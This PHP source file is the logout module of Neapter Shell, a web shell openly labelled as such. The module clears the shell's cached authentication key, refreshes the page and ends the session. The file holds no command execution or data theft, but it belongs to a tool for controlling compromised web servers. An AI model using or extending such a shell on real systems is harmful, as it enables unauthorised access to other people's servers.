<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Logout, remove auth file
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleLogout extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'logout',
            'quit',
            'exit'
        );
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-06-06 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
exit, quit, logout - Wylogowanie z shella

    Użycie:
        logout
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        $sAuthKeyFile = $this->oUtils->getAuthFileKey();
        $sAuth = $this->oUtils->cacheGet($sAuthKeyFile);

        if ($sAuth) {
            $this->oUtils->cacheSet($sAuthKeyFile, '');
        }

        @header('Refresh:1;url=' . Request::getCurrentUrl());
        echo "See you (:\n";

        $this->oShell->eof();
    }
}
